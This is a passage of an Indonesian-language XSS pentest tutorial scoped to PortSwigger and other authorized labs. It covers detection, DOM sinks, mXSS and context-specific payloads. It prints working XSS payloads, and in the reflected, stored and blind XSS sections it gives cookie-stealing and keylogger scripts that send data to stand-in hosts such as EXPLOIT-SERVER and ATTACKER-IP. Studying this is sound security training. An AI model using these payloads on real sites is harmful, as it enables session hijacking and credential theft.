---
id: "20"
title: "🔥 20 — XSS Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "20_xss_workflow.md"
refs_out: ["19","21","22","27"]
refs_in: ["21","27","29","30","31","33"]
---

← File 19: SQL Injection ([💉 19 — SQL Injection Workflow](/docs/sql-injection))

# 🔥 20 — XSS Workflow

> **Version:** 2.0 (Revised 2026-09-28) — Technical audit applied: errors fixed, lab-specific labels added, modern topics added. See audit report for full changelog.

> **Scope:** PortSwigger Academy, HackTheBox, TryHackMe, Proving Grounds, dan lab/target yang memang memberikan izin pengujian. **OS:** Parrot OS XFCE / Debian-based **Primary Tool:** Burp Suite (Proxy, Repeater, Intruder, Collaborator) **Secondary Tool:** Browser DevTools, curl (header/reflection check), python3 http.server **Level:** Beginner → Advanced **Goal:** membangun _muscle memory_ XSS dari detection → context identification → payload construction → validation → impact analysis berbasis alur PortSwigger Academy.

---

# 📚 Daftar Isi

- [⚡ Master XSS Workflow](#-master-xss-workflow)
- [🔥 0. XSS Fundamentals](#-0-xss-fundamentals)
- [🔴 1. Reflected XSS](#-1-reflected-xss)
    - [1.1 Cara Identify Reflected XSS](#11-cara-identify-reflected-xss)
    - [1.2 Basic Payloads Reflected XSS](#12-basic-payloads-reflected-xss)
    - [1.3 Reflected XSS Full Exploitation](#13-reflected-xss-full-exploitation)
- [🟠 2. Stored XSS](#-2-stored-xss)
    - [2.1 Cara Identify Stored XSS](#21-cara-identify-stored-xss)
    - [2.2 Basic Payloads Stored XSS](#22-basic-payloads-stored-xss)
    - [2.3 Stored XSS Full Exploitation](#23-stored-xss-full-exploitation)
- [🟡 3. DOM XSS](#-3-dom-xss)
    - [3.1 Konsep DOM XSS](#31-konsep-dom-xss)
    - [3.2 Common DOM XSS Sources](#32-common-dom-xss-sources)
    - [3.3 Common DOM XSS Sinks](#33-common-dom-xss-sinks)
    - [3.4 DOM XSS Testing](#34-dom-xss-testing)
    - [3.5 Mutation XSS (mXSS)](#35-mutation-xss-mxss)
- [🟢 4. Blind XSS](#-4-blind-xss)
    - [4.1 Konsep Blind XSS](#41-konsep-blind-xss)
    - [4.2 Blind XSS Payload Setup](#42-blind-xss-payload-setup)
    - [4.3 Burp Collaborator untuk Blind XSS](#43-burp-collaborator-untuk-blind-xss)
- [🎯 5. Context-Based Payloads](#-5-context-based-payloads)
    - [5.1 HTML Context](#51-html-context)
    - [5.2 HTML Attribute Context](#52-html-attribute-context)
    - [5.3 HTML href Attribute Context](#53-html-href-attribute-context)
    - [5.4 JavaScript String Context](#54-javascript-string-context)
    - [5.5 JavaScript Template Literal](#55-javascript-template-literal)
    - [5.6 onclick Event Handler Context](#56-onclick-event-handler-context)
    - [5.7 Canonical Link Tag Context](#57-canonical-link-tag-context)
    - [5.8 URL / javascript: Context](#58-url--javascript-context)
    - [5.9 CSS Context](#59-css-context)
    - [5.10 JSON Context](#510-json-context)
    - [5.11 AngularJS Expression (CSTI)](#511-angularjs-expression-csti)
    - [Context Master Table](#context-master-table)
- [🧬 6. Filter Bypass Techniques](#-6-filter-bypass-techniques)
    - [6.1 Tag Fuzzing dengan Burp Intruder](#61-tag-fuzzing-dengan-burp-intruder)
    - [6.2 Attribute Fuzzing dengan Burp Intruder](#62-attribute-fuzzing-dengan-burp-intruder)
    - [6.3 Custom Tag Bypass](#63-custom-tag-bypass)
    - [6.4 SVG Markup Bypass](#64-svg-markup-bypass)
    - [6.5 Keyword Filter Bypass](#65-keyword-filter-bypass)
    - [6.6 Quote Filter Bypass](#66-quote-filter-bypass)
    - [6.7 Space Filter Bypass](#67-space-filter-bypass)
    - [6.8 Bracket Filter Bypass](#68-bracket-filter-bypass)
    - [6.9 WAF Bypass Approach](#69-waf-bypass-approach)
    - [6.10 Polyglot XSS](#610-polyglot-xss)
- [🍪 7. XSS to Cookie Theft](#-7-xss-to-cookie-theft)
    - [7.1 Setup Receiver](#71-setup-receiver)
    - [7.2 XSS Payload Cookie Theft](#72-xss-payload-cookie-theft)
    - [7.3 Apa yang Dilakukan dengan Cookie](#73-apa-yang-dilakukan-dengan-cookie)
- [🔑 8. XSS to Password Capture & CSRF Bypass](#-8-xss-to-password-capture--csrf-bypass)
    - [8.1 XSS to Capture Passwords](#81-xss-to-capture-passwords)
    - [8.2 XSS to Bypass CSRF Defenses](#82-xss-to-bypass-csrf-defenses)
    - [8.3 HttpOnly Cookie — Batas dan Alternatif](#83-httponly-cookie--batas-dan-alternatif)
- [🛡️ 9. CSP Bypass](#️-9-csp-bypass)
    - [9.1 Apa Itu CSP](#91-apa-itu-csp)
    - [9.2 Cara Detect CSP](#92-cara-detect-csp)
    - [9.3 Common CSP Misconfigurations](#93-common-csp-misconfigurations)
    - [9.4 CSP Bypass Techniques](#94-csp-bypass-techniques)
    - [9.5 AngularJS Sandbox Escape](#95-angularjs-sandbox-escape)
    - [9.6 Event Handlers & href Attributes Blocked](#96-event-handlers--href-attributes-blocked)
    - [9.7 JavaScript URL dengan Karakter yang Diblok](#97-javascript-url-dengan-karakter-yang-diblok)
    - [9.8 Dangling Markup Attack](#98-dangling-markup-attack)
    - [9.9 CSP Bypass via Header Injection](#99-csp-bypass-via-header-injection)
- [🧰 10. Tools & Automation](#-10-tools--automation)
    - [10.1 Burp Suite (PRIMARY)](#101-burp-suite-untuk-xss-primary)
    - [10.2 Browser DevTools](#102-browser-devtools-untuk-xss)
    - [10.3 Dalfox](#103-dalfox--xss-scanner)
    - [10.4 XSStrike](#104-xsstrike)
    - [10.5 curl — Simple Output Check](#105-curl--simple-output-check)
- [⚙️ 11. Automation Scripts](#️-11-automation-scripts)
    - [11.1 xss_detect.sh](#111-script-xss_detectsh)
    - [11.2 cookie_stealer_server.py](#112-script-cookie_stealer_serverpy)
    - [11.3 XSS Payload Wordlist Generator](#113-xss-payload-wordlist-generator)
- [🌳 12. Master Decision Tree](#-12-master-decision-tree)
- [📋 13. PortSwigger Lab Quick Reference](#-13-portswigger-lab-quick-reference)
- [🛠️ 14. Common Errors & Troubleshooting](#️-14-common-errors--troubleshooting)
- [✅ 15. Final XSS Checklist](#-15-final-xss-checklist)
- [⚡ 16. Quick Reference](#-16-quick-reference)
- [🎮 17. Interactive Decision Guide](#-17-interactive-decision-guide)
- [🧬 18. Modern XSS Topics (DOM Clobbering, Prototype Pollution, postMessage)](#-18-modern-xss-topics)
- [🔐 19. Trusted Types](#-19-trusted-types)
- [🌐 20. Browser Reality / Execution Validation](#-20-browser-reality--execution-validation)
- [🛡️ 21. Authorized Pentest Workflow](#️-21-authorized-pentest-workflow)

---

# ⚡ Master XSS Workflow

```text
INPUT FOUND
↓
REFLECTION / STORAGE / DOM BEHAVIOR
↓
LOCATE EXACT SINK
↓
IDENTIFY CONTEXT  →  → Context determines payload, not the other way around
↓
IDENTIFY TRANSFORMATION (encoding? escape? sanitize?)
↓
SELECT CONTEXT-APPROPRIATE TEST (lihat Section 5)
↓
VALIDATE EXECUTION (di browser, bukan curl)
↓
CLASSIFY XSS (Reflected / Stored / DOM)
↓
ASSESS IMPACT (cookie? CSRF? credential capture?)
↓
DECIDE NEXT ACTION
```

**Payload tidak execute?** Jangan langsung ganti payload — diagnosa dulu:

```text
Payload gagal
↓
Apakah payload direfleksikan? → Tidak → cek Stored / DOM path
↓
Apakah karakter di-encode? → Ya → identifikasi encoding schema
↓
Apakah tag di-strip? → Ya → filter bypass (Section 6)
↓
Apakah context dibaca dengan benar? → Tidak → ulangi Section 5
↓
Apakah sink executable? → Tidak → cek DOM XSS (Section 3)
↓
Apakah CSP/filter/sanitizer berpengaruh? → Ya → Section 6 / Section 9
↓
Apakah Trusted Types aktif? → cek CSP header (require-trusted-types-for) → Section 19
↓
Apakah ada browser-specific behavior? → verifikasi di browser, cek DevTools Console
↓
Baru pilih alternate payload atau teknik
```

> **Navigation:** Section 12 adalah MASTER DECISION TREE untuk semua path. Section 16 adalah Quick Reference untuk testing cepat. Section 5 adalah sumber utama untuk payload.

---

# 🔥 0. XSS Fundamentals

## Apa Itu XSS?

**Cross-Site Scripting (XSS)** terjadi ketika input yang dikontrol attacker akhirnya diperlakukan browser sebagai executable content — biasanya JavaScript.

```text
Normal:

User Input → "hello" → HTML/Text → Browser tampilkan teks


XSS:

User Input
   │
   ▼
<script>...</script>
   │
   ▼
App memasukkan input tanpa encoding benar
   │
   ▼
Browser parsing sebagai code
   │
   ▼
JavaScript execute
```

Inti XSS:

```text
UNTRUSTED INPUT
      +
UNSAFE HTML/JS SINK
      +
BROWSER INTERPRETATION
      =
XSS
```

> **Reflection ≠ Execution.** Input yang muncul kembali di response bukan berarti XSS. Harus ada context break yang memungkinkan browser mengeksekusi sebagai code. Jangan tulis finding "XSS" hanya karena input di-reflect.

---

## Kenapa XSS Berbahaya?

XSS bukan sekadar `alert(1)`. Impact bergantung pada context dan privilege victim:

```text
XSS
 │
 ├── Read accessible page data
 ├── Perform actions as victim (CSRF via XSS)
 ├── Modify visible page (defacement)
 ├── Phishing / UI redressing
 ├── Capture keystrokes
 ├── Read non-HttpOnly cookies
 ├── Send authenticated requests
 └── Potential session compromise
```

---

## Reflected vs Stored vs DOM XSS

```text
                 XSS
                  │
       ┌──────────┼───────────┐
       ▼          ▼           ▼
  Reflected     Stored       DOM
       │          │            │
       ▼          ▼            ▼
  Request      Input stored   Source
     │          in server      │
     ▼              │           ▼
  Response         ▼         JavaScript
     │          Later page      │
     ▼          rendered        ▼
  Browser           │          Sink
  executes          ▼           │
                 Browser        ▼
                 executes    DOM updated
```

---

## Browser Security Model — Same-Origin Policy

XSS berbahaya karena script berjalan dalam origin aplikasi yang dipercaya:

```text
Victim Browser
      │
      ▼
https://target.example.com
      │
      ▼
Injected JavaScript
      │
      ▼
Runs under target.example.com origin
      │
      ▼
Akses cookie, DOM, localStorage, API calls — semuanya dalam context target
```

---

## Execution Context — Di mana Input Masuk?

|Context|Contoh HTML|Teknik Break|
|---|---|---|
|HTML body|`<div>INPUT</div>`|Inject tag baru|
|HTML attribute|`<input value="INPUT">`|Break dengan `"` atau `'`|
|JS string (single quote)|`var x = 'INPUT';`|Break dengan `'`|
|JS string (double quote)|`var x = "INPUT";`|Break dengan `"`|
|JS template literal|``var x = `INPUT`;``|Inject `${}`|
|URL / href|`<a href="INPUT">`|`javascript:` scheme|
|onclick handler|`onclick="goto('INPUT')"`|HTML entity `&apos;`|
|CSS|`color: INPUT`|Context-dependent|
|JSON|`{"x":"INPUT"}`|Trace ke sink|

> Payload detail per-context ada di **Section 5**.

---

# 🔴 1. Reflected XSS

# 1.1 Cara Identify Reflected XSS

## 📌 Kapan Digunakan

Gunakan saat input dari request muncul kembali di response tanpa disimpan secara persistent.

Lokasi umum:

```text
Search field
Error message
URL parameter
Form input
Redirect parameter
Filter / category parameter
```

---

## Setup Burp Suite

```text
1. Buka Burp Suite
2. Proxy → Open Browser
3. Pastikan "Intercept is off" dulu untuk browsing normal
4. Navigate ke target
5. Perform action (isi form, search, dll)
6. Proxy → HTTP History → temukan request
7. Right-click → Send to Repeater
8. Sekarang test dari Repeater
```

---

## Test Reflection — Burp Suite Repeater

Kirim marker dulu sebelum payload:

```text
Langkah 1:
Di Repeater, ubah parameter jadi marker unik
GET /search?q=xss1234 HTTP/2

Langkah 2:
Klik Send

Langkah 3:
Di tab Response, cari "xss1234"
Gunakan Ctrl+F di panel response
```

Kalau marker muncul di response:

```text
<div class="result">xss1234</div>
```

→ Input direfleksikan. Lanjut identifikasi context.

---

## Identifikasi Context dari Response

Di Burp Repeater, tab **Response**, lihat di mana persis marker muncul:

**HTML Body Context:**

```html
<div class="result">xss1234</div>
```

**Attribute Context:**

```html
<input type="text" value="xss1234">
```

**JavaScript String Context:**

```html
<script>
var searchTerm = 'xss1234';
</script>
```

**Href Context:**

```html
<a href="/search?q=xss1234">Back</a>
```

Kalau mau lihat render: klik tab **Render** di Repeater untuk preview visual.

→ Untuk payload spesifik per-context, lihat **Section 5**.

---

## Reflection ≠ XSS

Kalau source tampak:

```html
<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>
```

Artinya:

```text
✅ reflected
❌ executable (HTML-encoded)
```

Bandingkan kalau unencoded:

```html
<div><script>alert(1)</script></div>
```

```text
✅ reflected
✅ executable candidate
```

---

# 1.2 Basic Payloads Reflected XSS

## 📌 Kapan Digunakan

Setelah reflection ditemukan dan context sudah dipahami. Test dari Burp Repeater, verifikasi eksekusi di browser.

### HTML Body Context — Nothing Encoded

**PortSwigger Lab: Reflected XSS into HTML context with nothing encoded**

```html
<script>alert(1)</script>
```

Di Burp Repeater:

```text
GET /search?q=<script>alert(1)</script> HTTP/2

Response akan contain:
<div class="result"><script>alert(1)</script></div>
```

Copy URL dari Repeater → buka di browser → alert muncul.

---

### Event Handler (saat `<script>` diblok)

```html
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
```

---

## Cara Verifikasi Eksekusi di Browser

Dari Burp Repeater:

```text
Method 1:
Right-click request → Copy URL → paste di browser

Method 2:
Burp Repeater → kanan atas → "Show response in browser"
→ Copy URL → paste di browser

Method 3 (DOM XSS):
Langsung test di URL bar browser karena DOM XSS tidak butuh server round-trip
```

---

# 1.3 Reflected XSS Full Exploitation

## 📌 Kapan Digunakan

Setelah XSS confirmed, lab victim tersedia, dan perlu membuktikan impact.

```text
Attacker craft URL
    │
    ▼
Victim Browser
    │
    ▼
Target Page
    │
    ▼
Reflected Input
    │
    ▼
JavaScript Execute
    │
    ▼
Callback / Action
```

---

## Deliver ke Victim di Lab

Di PortSwigger labs, ada tombol "Go to exploit server" atau "Deliver exploit to victim".

```text
1. Craft payload URL:
   https://TARGET/search?q=<script>alert(1)</script>

2. URL-encode payload karena akan di-embed di HTML:
   https://TARGET/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E

3. Di exploit server:
   <script>document.location='https://TARGET/search?q=<script>alert(1)<\/script>'</script>

4. Store → Deliver to victim
```

---

## Cookie Theft Flow

```html
<script>
fetch('https://EXPLOIT-SERVER/log?cookie='+encodeURIComponent(document.cookie))
</script>
```

Atau pakai Burp Collaborator (lihat Section 7).

---

# 🟠 2. Stored XSS

# 2.1 Cara Identify Stored XSS

## 📌 Kapan Digunakan

Saat input dapat disimpan dan muncul kembali ketika halaman dibuka kemudian, bisa oleh user yang sama atau user lain.

Lokasi umum:

```text
Comment / forum post
Profile / bio / username
Product review
Support ticket
Guestbook
Filename pada upload
HTTP headers yang di-log (User-Agent, Referer)
```

---

## Test dengan Marker — Burp Suite

Di Burp Proxy (Intercept) atau Repeater:

```text
Langkah 1:
Intercept request saat submit comment/profile
POST /comment HTTP/2

name=xss1234&comment=xss1234test&postId=1

Langkah 2:
Kirim. Kemudian navigate ke halaman yang menampilkan data tersebut.

Langkah 3:
Cari marker di response halaman:
<p>xss1234test</p>  ← stored dan di-render

Langkah 4:
Cek apakah juga muncul di halaman lain / user lain
```

---

## Confirm Stored XSS

**PortSwigger Lab: Stored XSS into HTML context with nothing encoded**

```text
1. Open Burp, intercept POST request saat kirim comment
2. Ubah field comment jadi:
   <script>alert(1)</script>

3. Forward request
4. Navigate ke halaman yang menampilkan comment
5. Alert muncul → Stored XSS confirmed
```

---

# 2.2 Basic Payloads Stored XSS

## 📌 Kapan Digunakan

Setelah persistent reflection dikonfirmasi.

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```

---

## Cookie PoC

```html
<script>
fetch('https://EXPLOIT-SERVER/log?cookie='+encodeURIComponent(document.cookie))
</script>
```

Atau pakai Burp Collaborator URL.

---

## Keylogger — Konsep Lab

```html
<script>
document.addEventListener('keydown', function(e) {
    fetch('https://EXPLOIT-SERVER/log?key='+encodeURIComponent(e.key));
});
</script>
```

Berguna untuk password capture lab (lihat Section 8.1).

---

# 2.3 Stored XSS Full Exploitation

## 📌 Kapan Digunakan

Ketika stored payload diproses oleh user/admin lain (Blind Stored XSS).

```text
Attacker
   │
   ▼
Comment / Ticket / Profile
   │
   ▼
Stored in DB
   │
   ▼
Admin opens page
   │
   ▼
Browser executes
   │
   ▼
Callback receiver
```

---

## Burp Repeater — Test Stored Payload

```text
1. Proxy → HTTP History → cari POST request (comment/profile)
2. Send to Repeater
3. Ubah body:
   comment=<script>alert(1)</script>
4. Send
5. Buka halaman yang menampilkan comment di browser
6. Alert muncul = Stored XSS confirmed
```

---

## Receiver Setup

Untuk PortSwigger labs → pakai **Exploit Server** yang sudah disediakan atau **Burp Collaborator** (lihat Section 4.3).

Untuk local lab / fallback:

```bash
python3 -m http.server 8000
```

Payload:

```html
<script>
fetch('http://ATTACKER-IP:8000/?event=stored-xss')
</script>
```

---

# 🟡 3. DOM XSS

# 3.1 Konsep DOM XSS

## 📌 Kapan Digunakan

Saat input berasal dari client-side source (URL, hash, window.name) dan diproses JavaScript menuju dangerous sink.

DOM XSS tidak bisa di-test dengan curl. Harus di browser.

---

## Source → Sink

```text
SOURCE
   │
   ▼
location.search  (URL parameter)
location.hash    (URL fragment #...)
document.URL     (full URL)
document.referrer
window.name
   │
   ▼
JavaScript processing
   │
   ▼
SINK (dangerous)
   │
   ▼
innerHTML / document.write / eval / setTimeout / jQuery / href
```

---

# 3.2 Common DOM XSS Sources

|Source|Contoh|Notes|
|---|---|---|
|`document.URL`|full URL|Termasuk semua component URL|
|`document.location`|location object|Alias dari `window.location`|
|`document.location.href`|full URL string|Paling sering di-trace|
|`document.referrer`|URL halaman sebelumnya|Dikirim oleh browser; bisa dimanipulasi via iframe|
|`window.name`|cross-navigation value|Persists across navigation; bisa diset dari halaman lain|
|`location.hash`|`#payload` (tidak dikirim ke server)|Fragment tidak di-send ke server → tidak bisa test via curl|
|`location.search`|`?q=payload`|Termasuk dalam server request|
|`URLSearchParams`|`new URLSearchParams(location.search).get('q')`|Wrapper untuk parsing search params|
|`postMessage data`|`event.data` di message handler|Cross-origin DOM XSS; harus trace event listener|
|`localStorage`|`localStorage.getItem('key')`|Persistent storage; bisa tainted dari injection sebelumnya|
|`sessionStorage`|`sessionStorage.getItem('key')`|Session-scoped storage|
|`document.cookie` (untuk write ke DOM)|`document.cookie`|Hanya jika nilai cookie masuk ke sink; bukan untuk read context|
|`history.state`|`history.state.data`|Jarang tapi ada di SPA|

> **postMessage note:** DOM XSS via postMessage butuh:
> 
> 1. Ada `window.addEventListener('message', handler)`
> 2. Handler tidak memvalidasi `event.origin`
> 3. `event.data` masuk ke dangerous sink
> 
> Cara detect: DevTools → Sources → cari `addEventListener('message'`

---

# 3.3 Common DOM XSS Sinks

|Sink|Risiko|Payload Type|Notes|
|---|---|---|---|
|`innerHTML`|HTML parsing|`<img src=1 onerror=alert(1)>`|`<script>` TIDAK execute via innerHTML|
|`outerHTML`|HTML replacement|sama seperti innerHTML|Replaces element + content|
|`insertAdjacentHTML()`|HTML parsing|`<img src=1 onerror=alert(1)>`|Sama seperti innerHTML; sering terlupakan di audit|
|`document.write()`|HTML injection|`<script>alert(1)</script>` atau close existing tag|Dapat menutup `<script>` tag yang ada|
|`DOMParser.parseFromString()`|HTML/XML parsing|`<img src=1 onerror=alert(1)>`|Jika output di-insert ke DOM|
|`eval()`|JS execution|`alert(1)`|Paling berbahaya; jarang ada di modern code|
|`Function(string)()`|JS execution|`alert(1)`|Equivalent eval; sering dipakai di template engines|
|`setTimeout(string, delay)`|string execution|`alert(1)`|Hanya string form yang dangerous, bukan function form|
|`setInterval(string, delay)`|string execution|`alert(1)`|Sama dengan setTimeout|
|`jQuery()` / `$()`|HTML/selector injection|`<img src=1 onerror=alert(1)>`|jQuery HTML parsing jika input diawali `<`|
|`jQuery.html()`|HTML injection|`<img src=1 onerror=alert(1)>`|Alias untuk innerHTML via jQuery|
|`href` attribute assignment|URL execution|`javascript:alert(1)`|`element.href = userInput`|
|`src` attribute assignment|URL execution|`javascript:alert(1)` (context-dependent)|Tergantung element type|
|`location` / `location.href`|redirect/execution|`javascript:alert(1)`|URL navigation|
|`document.domain`|SOP relaxation|(not direct XSS)|Bisa memperluas attack surface|

---

## innerHTML — Penting!

`innerHTML` **tidak mengeksekusi** `<script>`:

```html
element.innerHTML = '<script>alert(1)</script>';
// TIDAK execute
```

Gunakan event handler sebagai gantinya:

```html
element.innerHTML = '<img src=1 onerror=alert(1)>';
// EXECUTE ✅
```

---

# 3.4 DOM XSS Testing

## 📌 Kapan Digunakan

Saat ada indikasi client-side JS memproses URL/hash ke dangerous sink.

---

## Langkah 1: Audit JS di DevTools

```text
F12 → Sources → Ctrl+Shift+F (global search)

Cari:
- innerHTML
- outerHTML
- document.write
- eval(
- setTimeout(
- setInterval(
- location.hash
- location.search
- document.URL
- $(location
- $("
- jQuery(
```

---

## Langkah 2: Trace Source → Sink

Contoh JS yang vulnerable:

```javascript
// Source: location.search
var q = new URLSearchParams(location.search).get("q");

// Sink: innerHTML
document.getElementById("result").innerHTML = q;
```

Trace:

```text
location.search
      │
      ▼
URLSearchParams
      │
      ▼
q
      │
      ▼
innerHTML ← SINK
      │
      ▼
DOM XSS
```

---

## Langkah 3: Test Payload di Browser

**PortSwigger Lab: DOM XSS in innerHTML sink using source location.search**

Di URL bar browser langsung:

```text
https://TARGET/search?q=<img src=1 onerror=alert(1)>
```

Kenapa `<img>` bukan `<script>`? Karena sink-nya `innerHTML` — `<script>` tidak dieksekusi via innerHTML.

---

## PortSwigger Lab: DOM XSS in document.write sink using source location.search

Source code JS:

```javascript
document.write('<img src="/images/tracker.gif?searchTerms='+query+'">');
```

Input `xss1234` menghasilkan:

```html
<img src="/images/tracker.gif?searchTerms=xss1234">
```

Untuk break out dari atribut `src`:

```text
URL: https://TARGET/search?q="><svg onload=alert(1)>
```

---

## PortSwigger Lab: DOM XSS in document.write sink inside a select element

Source code JS:

```javascript
document.write('<select><option>'+storeId+'</option></select>');
```

```text
URL: https://TARGET/product?productId=1&storeId=</select><img src=1 onerror=alert(1)>
```

---

## PortSwigger Lab: DOM XSS in jQuery anchor href using location.search

```javascript
$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
```

```text
URL: https://TARGET/?returnPath=javascript:alert(1)
```

Klik link "Back" → alert execute.

---

## PortSwigger Lab: DOM XSS in jQuery selector sink using hashchange event

```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    post.get(0).scrollIntoView();
});
```

Payload via iframe (karena hash tidak dikirim ke server):

```html
<!-- Di exploit server -->
<iframe src="https://TARGET/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
```

---

## PortSwigger Lab: Reflected DOM XSS

Server menempatkan search term dalam JSON response yang langsung di-eval client-side:

```javascript
eval('var searchResults = ' + responseText);
```

Input masuk ke JSON string, server meng-escape `"` tapi tidak `\`:

```text
Input: \"-alert(1)}//

Hasil JSON:
{"results":[], "searchTerm":"\\"-alert(1)}//"}
```

Dalam eval: `\\` = literal `\`, `"` menutup string, lalu `}//` menutup object dan comment.

---

## PortSwigger Lab: Stored DOM XSS

innerHTML digunakan untuk render comment. Ada partial sanitization yang memblok `<>` di awal tapi bisa di-bypass:

```html
<><img src=1 onerror=alert(1)>
```

`<>` kosong di awal "menghabiskan" sanitization, `<img>` berikutnya lolos.

---

## PortSwigger Lab: DOM XSS in AngularJS expression

Halaman menggunakan AngularJS (`ng-app`). Angle brackets dan double quotes HTML-encoded. Tapi AngularJS eval `{{ }}` expression:

```text
URL: https://TARGET/search?q={{$on.constructor('alert(1)')()}}
```

Lihat Section 5.11 untuk detail CSTI.

---

# 3.5 Mutation XSS (mXSS)

## 📌 Kapan Digunakan

Ketika aplikasi menerapkan HTML sanitizer (DOMPurify versi lama, whitelist regex) sebelum dimasukkan ke `innerHTML`. Sanitizer merasa "aman" tapi browser parser me-mutate DOM sehingga payload execute.

---

## Mekanisme mXSS

```text
1. Sanitization Pass
   Input string → Sanitizer memeriksa → "dianggap aman" (tag/atribut tampak valid)
         │
         ▼
2. DOM Re-parsing via innerHTML
   Browser parser melakukan normalisasi/mutasi DOM
   (pada <noscript>, MathML, SVG, atau atribut belum tertutup)
         │
         ▼
3. Execution
   Mutasi mengubah struktur DOM → string yang semula di atribut/tag pasif
   melompat keluar → menjadi tag/event handler executable
```

---

## Contoh 1: Tag Breakout via Atribut Tidak Tertutup

```html
<p id="</p><img src=x onerror=alert(1)>">
```

- **Saat sanitasi:** Sanitizer menganggap seluruh teks setelah `id="` adalah nilai atribut string biasa → aman
- **Saat browser rendering via innerHTML:** Parser menutup tag `<p>` terlebih dahulu, lalu me-render `<img>` sebagai elemen baru → `onerror` execute

## Contoh 2: Namespace Confusion (MathML / SVG)

```html
<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>
```

Parser berpindah dari XML/MathML namespace kembali ke HTML namespace, memicu rekonstruksi pohon DOM yang mengeksekusi payload.

---

# 🟢 4. Blind XSS

# 4.1 Konsep Blind XSS

## 📌 Kapan Digunakan

Saat payload disimpan dan diproses oleh halaman yang tidak bisa dilihat langsung (admin panel, internal dashboard, log viewer, support ticket viewer).

```text
Support Ticket
     │
     ▼
Attacker submits payload
     │
     ▼
Stored in DB
     │
     ▼
Admin panel
     │
     ▼
Admin opens ticket
     │
     ▼
XSS executes di browser admin
     │
     ▼
Callback ke attacker
     (cookie admin / screenshot / etc)
```

---

# 4.2 Blind XSS Payload Setup

Karena tidak ada alert visible, butuh callback ke server eksternal.

Payload minimal (konfirmasi eksekusi):

```html
<script>
fetch('https://ATTACKER/?blind=1')
</script>
```

Cookie callback:

```html
<script>
fetch('https://ATTACKER/?c='+encodeURIComponent(document.cookie))
</script>
```

---

# 4.3 Burp Collaborator untuk Blind XSS

Burp Collaborator lebih reliable daripada python server untuk lab.

```text
1. Burp → Burp Collaborator (di menu atas)
2. Klik "Copy to clipboard"
   → Dapat URL seperti: abc123def456.oastify.com

3. Buat payload:
   <script>
   fetch('https://abc123def456.oastify.com/?c='+encodeURIComponent(document.cookie))
   </script>

4. Submit ke form yang akan dilihat admin

5. Kembali ke Burp Collaborator
6. Klik "Poll now"
7. Lihat interaction yang masuk:
   GET /?c=session=admin-cookie HTTP/1.1
   Host: abc123def456.oastify.com
```

---

## Fallback: python3 http.server

Untuk kasus di mana callback butuh local server (lab environment):

```bash
python3 -m http.server 8000
```

Payload:

```html
<script>
fetch('http://ATTACKER-IP:8000/?c='+encodeURIComponent(document.cookie))
</script>
```

> Catatan: untuk PortSwigger labs, pakai exploit server atau Collaborator — python server tidak reachable dari cloud labs.

---

# 🎯 5. Context-Based Payloads

> **Prinsip utama:** Context determines payload, bukan sebaliknya. Jangan pilih payload berdasarkan "payload apa yang paling kuat", tapi berdasarkan **context tempat input dimasukkan** dan **encoding yang diterapkan**.

---

# 5.1 HTML Context

## 📌 Kapan Digunakan

Input berada langsung di HTML body, di antara tags, tanpa encoding:

```html
<div class="result">INPUT</div>
```

---

## Test

Kirim marker dulu di Burp Repeater:

```text
q=xss1234

Response: <div class="result">xss1234</div>
```

Kalau marker muncul sebagai text biasa → HTML Body Context.

---

## Payload

**PortSwigger Lab: Reflected XSS into HTML context with nothing encoded**

```html
<script>alert(1)</script>
```

**PortSwigger Lab: Stored XSS into HTML context with nothing encoded**

```html
<script>alert(1)</script>
```

Alternatif kalau `<script>` diblok:

```html
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
```

---

# 5.2 HTML Attribute Context

## 📌 Kapan Digunakan

Input berada di dalam nilai atribut HTML:

```html
<input type="text" value="INPUT">
```

Angle brackets HTML-encoded. Tapi `"` (quote yang menutup atribut) bisa dieksploitasi.

---

## PortSwigger Lab: Reflected XSS into attribute with angle brackets HTML-encoded

Marker response:

```html
<input type="text" value="xss1234">
```

`<script>` tidak akan jalan karena angle brackets di-encode. Tapi `"` tidak di-encode:

```text
Payload: " onmouseover="alert(1)

Hasil:
<input type="text" value="" onmouseover="alert(1)">
```

Hover mouse di atas input → alert execute.

Alternatif yang auto-trigger:

```text
" autofocus onfocus="alert(1)

Hasil:
<input type="text" value="" autofocus onfocus="alert(1)">
```

Auto-trigger saat page load (element autofocus).

---

# 5.3 HTML href Attribute Context

## 📌 Kapan Digunakan

Input berada di dalam atribut `href`. Double quotes mungkin HTML-encoded tapi nilai href bisa berisi `javascript:` scheme.

---

## PortSwigger Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

Input tersimpan dan muncul sebagai URL di anchor:

```html
<a href="INPUT">Website</a>
```

Double quotes HTML-encoded, tapi `javascript:` scheme tidak diblok:

```text
Payload: javascript:alert(1)

Hasil:
<a href="javascript:alert(1)">Website</a>
```

Klik link → alert execute.

---

# 5.4 JavaScript String Context

## 📌 Kapan Digunakan

Input berada di dalam JavaScript string di antara `<script>` tags:

```html
<script>
var x = 'INPUT';
</script>
```

Setiap sub-scenario punya encoding yang berbeda. Analisis encoding dulu sebelum memilih payload.

---

## 5.4a JS String — Angle Brackets HTML Encoded

**PortSwigger Lab: Reflected XSS into JS string with angle brackets HTML encoded**

Context:

```javascript
var searchTerms = 'INPUT';
```

`<>` di-encode → tidak bisa `</script>`. Tapi `'` tidak di-escape.

```text
Payload: '-alert(1)-'

Hasil:
var searchTerms = ''-alert(1)-'';
```

`'` menutup string, `-alert(1)-` adalah JS expression (unary minus), `'` membuka string baru. Semua valid JS.

Alternatif:

```text
';alert(1)//

Hasil:
var searchTerms = '';alert(1)//'';
```

---

## 5.4b JS String — Single Quote dan Backslash Escaped

**PortSwigger Lab: Reflected XSS into JS string with single quote and backslash escaped**

Encoding yang diterapkan:

- `'` → `\'`
- `\` → `\\`

